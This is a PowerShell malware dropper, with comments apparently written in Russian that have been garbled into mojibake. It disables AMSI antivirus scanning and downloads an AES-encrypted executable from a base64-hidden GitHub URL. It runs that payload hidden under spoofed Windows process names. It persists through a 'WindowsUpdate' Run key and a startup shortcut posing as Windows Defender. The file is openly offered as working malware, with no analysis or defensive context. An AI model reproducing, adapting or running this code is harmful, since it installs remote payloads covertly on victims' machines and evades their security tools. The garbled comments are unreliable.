$ErrorActionPreference = 'SilentlyContinue'

# MUTEX
$mutexName = "Global\OneDriveSync_" + $env:USERNAME
$mutexCreated = $false
$mutex = $null
try {
    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$mutexCreated)
    if (!$mutexCreated) { exit }
} catch { exit }

# AMSI BYPASS
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Start-Sleep -Seconds (Get-Random -Min 20 -Max 60)

# === Œ¡Ÿ»…  Àﬁ◊ (‰Îˇ ‚ÒÂı Ï‡¯ËÌ) ===
$secret = "EvilGroup2026_SecretKey"
$key = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($secret))

# USER-AGENT
$userAgents = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0"
)

# — ¿◊»¬¿Õ»≈ » –¿—ÿ»‘–Œ¬ ¿
$b64 = $null
try {
    # Base64-Ó·ÙÛÒÍ‡ˆËˇ ÒÒ˚ÎÍË
    $encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V2aWxncm91LXRlY2gvZHJpdmVycy9tYWluL2VuY3J5cHRlZC5iNjQ="
    $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
    
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", (Get-Random -InputObject $userAgents))
    $b64 = $wc.DownloadString($url)
    
    $b64 = $b64 -replace '[^A-Za-z0-9+/=]', ''
    while ($b64.Length % 4 -ne 0) { $b64 += '=' }
} catch {
    if ($mutex) { $mutex.ReleaseMutex() }
    exit
}

# –¿—ÿ»‘–Œ¬ ¿
$enc = [Convert]::FromBase64String($b64)
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = [byte[]]@(0)*16
try {
    $dec = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
} catch {
    if ($mutex) { $mutex.ReleaseMutex() }
    exit
}

if ($dec.Length -lt 2 -or $dec[0] -ne 0x4D -or $dec[1] -ne 0x5A) {
    if ($mutex) { $mutex.ReleaseMutex() }
    exit
}

# ”Õ»¬≈–—¿À‹Õ¿ﬂ œ¿œ ¿
$pkgPath = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $pkgPath)) {
    New-Item -ItemType Directory -Path $pkgPath -Force | Out-Null
}
$binPath = "$pkgPath\Update.bin"
[IO.File]::WriteAllBytes($binPath, $dec)
$attr = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
[System.IO.File]::SetAttributes($binPath, $attr)

# ‘≈… Œ¬€≈ œ–Œ÷≈——€
$fakeProcesses = @("explorer.exe")
if (Test-Path "$env:SystemRoot\System32\notepad.exe") {
    $fakeProcesses += "notepad.exe"
}

$possibleBrowsers = @(
    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe",
    "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
    "$env:ProgramFiles(x86)\Microsoft\Edge\Application\msedge.exe"
)

foreach ($browser in $possibleBrowsers) {
    if (Test-Path $browser) {
        $name = Split-Path $browser -Leaf
        if ($name -eq "chrome.exe" -or $name -eq "msedge.exe") {
            $fakeProcesses += "`"$browser`" --new-window about:blank"
        } else {
            $fakeProcesses += "`"$browser`" about:blank"
        }
    }
}

# «¿œ”—  ‘≈… ¿
$shell = New-Object -ComObject WScript.Shell
$shell.Run($fakeProcesses[(Get-Random -Maximum $fakeProcesses.Count)], 0, $false)

# «¿œ”—  PAYLOAD
$exeNames = @("TextInputHost.exe", "RuntimeBroker.exe", "ctfmon.exe", "dwm.exe")
$exePath = "$pkgPath\" + ($exeNames | Get-Random)
[IO.File]::WriteAllBytes($exePath, $dec)
[System.IO.File]::SetAttributes($exePath, $attr)
Start-Process $exePath -WindowStyle Hidden
Start-Sleep -Seconds 10
Remove-Item $exePath -Force -ErrorAction SilentlyContinue

# === œ≈–—»—“≈Õ“ÕŒ—“‹ ===
$ps1Path = "$pkgPath\update.ps1"
$psContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Seconds (Get-Random -Min 30 -Max 90)
`$secret = "EvilGroup2026_SecretKey"
`$key = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$secret))
`$encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V2aWxncm91LXRlY2gvZHJpdmVycy9tYWluL2VuY3J5cHRlZC5iNjQ="
`$url = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$encodedUrl))
`$b64 = (New-Object Net.WebClient).DownloadString(`$url)
`$b64 = `$b64 -replace '[^A-Za-z0-9+/=]', ''
while (`$b64.Length % 4 -ne 0) { `$b64 += '=' }
`$enc = [Convert]::FromBase64String(`$b64)
`$aes = [Security.Cryptography.Aes]::Create()
`$aes.Key = `$key
`$aes.IV = [byte[]]@(0)*16
`$dec = `$aes.CreateDecryptor().TransformFinalBlock(`$enc, 0, `$enc.Length)
`$binPath = "$binPath"
[IO.File]::WriteAllBytes(`$binPath, `$dec)
`$attr = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
[System.IO.File]::SetAttributes(`$binPath, `$attr)
`$exeNames = @("TextInputHost.exe", "RuntimeBroker.exe", "ctfmon.exe", "dwm.exe")
`$exePath = "$pkgPath\\" + (`$exeNames | Get-Random)
[IO.File]::WriteAllBytes(`$exePath, `$dec)
[System.IO.File]::SetAttributes(`$exePath, `$attr)
Start-Process `$exePath -WindowStyle Hidden
Start-Sleep -Seconds 10
Remove-Item `$exePath -Force -ErrorAction SilentlyContinue
"@

[IO.File]::WriteAllText($ps1Path, $psContent, [Text.Encoding]::UTF8)
[System.IO.File]::SetAttributes($ps1Path, $attr)

# Run key
try {
    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $runKey -Name "WindowsUpdate" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`"" -Force
} catch {}

# Startup shortcut
try {
    $lnkPath = [Environment]::GetFolderPath('Startup') + "\Windows Defender.lnk"
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($lnkPath)
    $sc.TargetPath = "powershell.exe"
    $sc.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
    $sc.IconLocation = "imageres.dll,-102"
    $sc.Description = "Windows Defender Security"
    $sc.Save()
    [System.IO.File]::SetAttributes($lnkPath, [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
} catch {}

if ($mutex) { $mutex.ReleaseMutex() }